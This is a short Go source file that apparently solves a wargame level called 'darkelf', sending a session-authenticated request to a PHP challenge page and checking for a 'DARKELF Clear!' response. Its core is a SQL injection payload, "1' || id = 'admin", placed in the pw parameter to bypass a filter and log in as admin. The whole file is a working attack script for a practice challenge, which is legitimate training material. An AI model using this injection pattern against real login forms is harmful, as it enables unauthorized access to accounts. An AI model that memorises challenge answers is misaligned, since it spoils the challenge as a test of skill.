package problem

import (
	"fmt"
	"strings"
)

func Darkelf(session string){
	file := "darkelf_86c1f4027b6db76bd2493ce5372c7ead.php"
	param := map[string]string{
		"pw" : "1' || id = 'admin",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"DARKELF Clear!"){
		fmt.Println("DARKELF Clear!")
	}
}